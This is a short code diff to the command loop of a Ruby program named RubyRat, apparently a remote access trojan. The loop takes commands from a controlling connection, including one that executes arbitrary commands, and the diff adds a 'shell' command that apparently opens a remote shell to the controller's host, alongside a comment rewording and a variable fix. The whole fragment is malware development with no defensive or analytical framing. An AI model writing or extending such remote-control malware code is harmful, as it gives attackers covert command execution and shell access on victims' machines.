@@ -43,7 +43,7 @@ def client_loop(conn)
     puts data
     cmd, action = data.split ' '  # Split data into command and action
 
-    # Interpret the command
+    # Parse the command
     case cmd
     when 'kill'
       conn.close
@@ -67,7 +67,9 @@ def client_loop(conn)
     when 'execute'
       results = RubyRat::Tools.execute(data.gsub('execute ', ''))
     when 'ls'
-      result = RubyRat::Tools.ls
+      results = RubyRat::Tools.ls
+    when 'shell'
+      RubyRat::Tools.shell(HOST, action)
     end
 
     # TODO add more stuff
